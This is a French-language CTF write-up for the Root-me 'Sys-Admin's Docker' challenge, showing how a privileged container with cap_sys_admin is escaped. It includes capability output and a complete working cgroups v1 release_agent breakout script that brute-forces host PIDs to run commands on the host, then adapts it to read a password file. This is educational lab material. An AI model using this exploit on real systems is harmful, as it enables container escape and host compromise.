---
title: Root-me - Sys-Admin’s Docker
meta_title: ""
description: 
date: 2024-06-07T05:00:00Z
image: /images/rootme_logo.png
categories:
  - Forensic
  - Facile
author: Tmax
tags:
  - Forensic
  - Rootme
  - Docker
draft: false
---

# Introduction

Pour ce challenge, nous allons devoir travailler avec des conteneurs. 

{{< tabs >}} {{< tab "Niveau 1" >}}
- Vous avez bien lu la description du challenge ? Les ressources également ? Le titre ? 
- Vous avez regardé le contenu qu'Hacktricks propose ?  

{{< /tab >}}

{{< tab "Niveau 2" >}}

Une fois qu'on a la main sur le conteneur, la première chose à faire est de vérifier les capabilities. Ce sont en quelques sortes les privilèges qui sont accordés à notre conteneur. 

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_admin,cap_mknod,cap_audit_write,cap_setfcap
Ambient set =
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
 secure-no-ambient-raise: no (unlocked)
uid=0(root) euid=0(root)
gid=0(root)
groups=0(root)
Guessed mode: UNCERTAIN (0)
```

On a beaucoup de cap intéressantes (net_raw, sys_admin, sys_chroot) qui nous laissent penser que le conteneur est démarré en `privilegied`. 
Normalement, on se contenterait de monter les partitions `/dev/s*` mais elles ne sont pas disponible. 

Si on fait un tour sur Hacktricks, il semble que le cap `sys_admin` nous permettent d'exploiter une vulnérabilité de la fonctionnalité notify_on_release dans cgroupsv1.

Ici nous pouvons retrouver des scripts pour pouvoir réaliser ce [breakout](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privileged-escape-abusing-release_agent-without-known-the-relative-path-poc3). 

```bash
#!/bin/sh

OUTPUT_DIR="/"
MAX_PID=65535
CGROUP_NAME="xyx"
CGROUP_MOUNT="/tmp/cgrp"
PAYLOAD_NAME="${CGROUP_NAME}_payload.sh"
PAYLOAD_PATH="${OUTPUT_DIR}/${PAYLOAD_NAME}"
OUTPUT_NAME="${CGROUP_NAME}_payload.out"
OUTPUT_PATH="${OUTPUT_DIR}/${OUTPUT_NAME}"

# Run a process for which we can search for (not needed in reality, but nice to have)
sleep 10000 &

# Prepare the payload script to execute on the host
cat > ${PAYLOAD_PATH} << __EOF__
#!/bin/sh

OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}

# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__

# Make the payload script executable
chmod a+x ${PAYLOAD_PATH}

# Set up the cgroup mount using the memory resource cgroup controller
mkdir ${CGROUP_MOUNT}
mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}
mkdir ${CGROUP_MOUNT}/${CGROUP_NAME}
echo 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release

# Brute force the host pid until the output path is created, or we run out of guesses
TPID=1
while [ ! -f ${OUTPUT_PATH} ]
do
  if [ $((${TPID} % 100)) -eq 0 ]
  then
    echo "Checking pid ${TPID}"
    if [ ${TPID} -gt ${MAX_PID} ]
    then
      echo "Exiting at ${MAX_PID} :-("
      exit 1
    fi
  fi
  # Set the release_agent path to the guessed pid
  echo "/proc/${TPID}/root${PAYLOAD_PATH}" > ${CGROUP_MOUNT}/release_agent
  # Trigger execution of the release_agent
  sh -c "echo \$\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs"
  TPID=$((${TPID} + 1))
done

# Wait for and cat the output
sleep 1
echo "Done! Output:"
cat ${OUTPUT_PATH}

```

Cet exploit fonctionne et je peux donc envoyer un ps aux sur l'hote. Alors je peux envoyer la commande que je veux.  

Il suffit de modifier 

```
# Commands to run on the host<
ps -eaf > \${OUTPATH} 2>&1
__EOF__
```

par 

```
cat .passwd > \${OUTPATH} 2>&1
cat /passwd > \${OUTPATH} 2>&1
```


{{< /tab >}}
{{< /tabs >}}